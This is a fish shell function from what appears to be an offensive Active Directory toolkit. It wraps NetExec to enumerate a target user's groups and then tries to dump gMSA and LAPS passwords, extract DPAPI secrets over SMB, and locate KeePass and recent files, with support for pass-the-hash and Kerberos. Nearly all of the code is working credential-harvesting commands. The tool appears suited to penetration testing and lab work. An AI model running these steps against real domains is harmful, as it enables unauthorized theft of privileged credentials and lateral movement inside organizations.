function _ezpz_enumuser
    source $EZPZ_HOME/functions/_ezpz_colors.fish

    # ASCII banner
    echo ''
    echo '                           '(set_color yellow --bold)'  |  |   __|  __|  _ \ '(set_color normal)
    echo '     -_)    \   |  |   ` \ '(set_color yellow --bold)'  |  | \__ \  _|     / '(set_color normal)
    echo '   \___| _| _| \_,_| _|_|_|'(set_color yellow --bold)' \__/  ____/ ___| _|_\ '(set_color normal)
    echo ''

    # Usage message
    set usage "
Usage: ezpz enumuser -t <target> -u <user> [-p <password> | -H <hash>] [-d <domain>] [-k]
  Enumerates a specific user's groups, rights, and potential access.

  -t, --target    Target Domain Controller IP or hostname (Required)
  -u, --user      Username to enumerate (Required)
  -p, --password  Password for authentication
  -H, --hash      NTLM hash for pass-the-hash authentication
  -d, --domain    Domain for authentication (optional)
  -k, --kerb      Use Kerberos authentication (requires a valid TGT)

Examples:
  ezpz enumuser -t 10.10.10.10 -u administrator -p password123
  ezpz enumuser -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local
"

    # Check required tools
    set required_tools nxc
    for tool in $required_tools
        if not command -v $tool >/dev/null 2>&1
            ezpz_error "Required tool not found: $tool"
            return 1
        end
    end

    # Parse arguments
    argparse 't/target=' 'u/user=' 'p/password=' 'H/hash=' 'd/domain=' 'k/kerb' 'h/help' -- $argv
    or begin
        ezpz_error "Invalid arguments."
        echo $usage
        return 1
    end

    if set -q _flag_help
        echo $usage
        return 1
    end

    # Check required arguments
    if not set -q _flag_target
        ezpz_error "Missing required argument: -t/--target"
        echo $usage
        return 1
    end

    if not set -q _flag_user
        ezpz_error "Missing required argument: -u/--user"
        echo $usage
        return 1
    end

    # Set variables
    set target $_flag_target
    set user $_flag_user

    # Extract DC FQDN from /etc/hosts if needed for Kerberos
    set dc_fqdn ""
    if set -q _flag_kerb
        set dc_fqdn (awk -v target="$target" '$1 == target {max_len=0; fqdn=""; for(i=2; i<=NF; i++) {if(length($i) > max_len) {max_len=length($i); fqdn=$i}} print fqdn; exit}' /etc/hosts)
        if test -n "$dc_fqdn"
            # Use FQDN instead of IP for Kerberos
            set target $dc_fqdn
        else
            ezpz_warn "DC FQDN not found in /etc/hosts for $_flag_target. Kerberos may fail."
        end
        
        # Time synchronization for Kerberos
        if command -v ntpdate >/dev/null 2>&1
            ezpz_info "Synchronizing clock with DC for Kerberos authentication..."
            sudo systemctl stop systemd-timesyncd
            sudo ntpdate -u $_flag_target >/dev/null 2>&1
        else
            ezpz_warn "ntpdate not found. Skipping time sync. Kerberos may fail if clocks are skewed."
        end
    end

    # Build nxc authentication arguments
    set nxc_auth $target
    if set -q _flag_domain
        set -a nxc_auth -u "$_flag_domain\\$user"
    else
        set -a nxc_auth -u "$user"
    end

    # Add authentication method
    if set -q _flag_password
        set -a nxc_auth -p "$_flag_password"
    else if set -q _flag_hash
        set -a nxc_auth -H "$_flag_hash"
    end

    if set -q _flag_kerb
        set -a nxc_auth -k
        if set -q KRB5CCNAME
            set -a nxc_auth --use-kcache
            ezpz_cmd "Using KRB5CCNAME at $KRB5CCNAME"
        end
    end




    ezpz_title "Starting user enumeration for '$user' on $target..."

    # Enumerate user groups
    ezpz_header "Enumerating '$user' groups"
    ezpz_cmd "nxc ldap $nxc_auth -M groupmembership -o USER=\"$user\""
    timeout 60 nxc ldap $nxc_auth -M groupmembership -o USER="$user" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5-
    if test $pipestatus[1] -eq 124
        ezpz_warn "Operation timed out. Skipping."
    end

    # Try to dump gMSA passwords
    ezpz_header "Trying to dump gMSA passwords with user's rights"
    ezpz_cmd "nxc ldap $nxc_auth --gmsa"
    timeout 60 nxc ldap $nxc_auth --gmsa 2>/dev/null | grep -aoE "Account:.*" --color=never
    if test $pipestatus[1] -eq 124
        ezpz_warn "Operation timed out. Skipping."
    end

    # Try to dump LAPS passwords
    ezpz_header "Trying to dump LAPS passwords with user's rights"
    ezpz_cmd "nxc ldap $nxc_auth -M laps"
    timeout 60 nxc ldap $nxc_auth -M laps 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 6-
    if test $pipestatus[1] -eq 124
        ezpz_warn "Operation timed out. Skipping LDAP LAPS."
    end
    
    ezpz_cmd "nxc smb $nxc_auth --laps --dpapi"
    timeout 60 nxc smb $nxc_auth --laps --dpapi 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 6-
    if test $pipestatus[1] -eq 124
        ezpz_warn "Operation timed out. Skipping SMB LAPS."
    end

    # Try to find KeePass files
    ezpz_header "Trying to find KeePass files readable by user"
    ezpz_cmd "nxc smb $nxc_auth -M keepass_discover"
    timeout 60 nxc smb $nxc_auth -M keepass_discover 2>/dev/null | grep -aoE "Found .*" --color=never
    if test $pipestatus[1] -eq 124
        ezpz_warn "Operation timed out. Skipping."
    end

    # Try to find Recent files
    ezpz_header "Trying to enumerate Recent Files"
    ezpz_cmd "nxc smb $nxc_auth -M recent_files"
    timeout 60 nxc smb $nxc_auth -M recent_files 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5-
    if test $pipestatus[1] -eq 124
        ezpz_warn "Operation timed out. Skipping."
    end

    ezpz_success "Done."
end